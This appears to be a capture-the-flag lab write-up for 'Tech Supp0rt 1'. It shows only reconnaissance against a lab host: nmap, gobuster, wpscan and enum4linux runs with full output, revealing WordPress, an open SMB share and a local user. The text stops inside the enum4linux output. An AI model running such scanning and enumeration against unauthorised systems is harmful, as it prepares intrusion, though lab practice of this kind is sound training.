# Tech Supp0rt 1


1. Enumerate with nmap.
```
root@ip-10-10-210-138:~# sudo nmap -sS -A 10.10.67.176

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-17 04:08 BST
Nmap scan report for ip-10-10-67-176.eu-west-1.compute.internal (10.10.67.176)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (EdDSA)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:05:4D:1C:5D:A5 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-04-17T08:39:12+05:30
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-17 04:09:14
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms ip-10-10-67-176.eu-west-1.compute.internal (10.10.67.176)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.24 seconds
```

2. Use gobuster to brute force directories. `/test` seems like a static page, and there's nothing of interest in the source either.
```
root@ip-10-10-210-138:~# gobuster dir -u http://10.10.67.176/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.67.176/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/17 04:10:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/test (Status: 301)
/phpinfo.php (Status: 200)
/wordpress (Status: 301)
===============================================================
2022/04/17 04:10:35 Finished
===============================================================
```

3. Enumerate wordpress with wpscan, but there doesn't seem to be anything too interesting there either
```
root@ip-10-10-210-138:~# wpscan --url http://10.10.67.176/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.67.176/wordpress/ [10.10.67.176]
[+] Started: Sun Apr 17 04:28:42 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.67.176/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.67.176/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.67.176/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.67.176/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.67.176/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.67.176/wordpress/, Match: 'WordPress 5.7.2'

[+] WordPress theme in use: teczilla
 | Location: http://10.10.67.176/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2021-11-17T00:00:00.000Z
 | Readme: http://10.10.67.176/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.3
 | Style URL: http://10.10.67.176/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.67.176/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==========================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sun Apr 17 04:28:47 2022
[+] Requests Done: 179
[+] Cached Requests: 5
[+] Data Sent: 42.46 KB
[+] Data Received: 18.635 MB
[+] Memory used: 254.852 MB
[+] Elapsed time: 00:00:05
```

4. Use enum4linux to enumerate smb shares and local users. We find the local users `nobody` and `scamsite`. We find the share `websvr`
```
root@ip-10-10-210-138:~# enum4linux 10.10.67.176
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 17 04:12:13 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.67.176
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.67.176    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.67.176    |
 ============================================ 
Looking up status of 10.10.67.176
No reply from 10.10.67.176

 ===================================== 
|    Session Check on 10.10.67.176    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 437.
[+] Server 10.10.67.176 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.67.176    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 359.
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.67.176    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.67.176 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 467.
[+] Got OS info for 10.10.67.176 from srvinfo:
	TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.67.176    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 866.
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 883.
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ========================================= 
|    Share Enumeration on 10.10.67.176    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 640.
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            

[+] Attempting to map shares on 10.10.67.176
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 654.
//10.10.67.176/print$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 654.
//10.10.67.176/websvr	Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 654.
//10.10.67.176/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.67.176    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on 10.10.67.176    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.67.176 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
[I] Found new SID: S-1-22-1
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 710.
[I] Found new SID: S-1-5-21-2071169391-1069193170-3284189824
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 742.
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-22-1-1000 Unix User\scamsite (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-500 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-501 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-502 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-503 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-504 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-505 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-506 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-507 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-508 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-509 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-510 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-511 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-512 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-513 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-514 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-515 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-516 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-517 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-518 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-519 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-520 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-521 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-522 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-523 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-524 *unknown*\*unknown* (8)
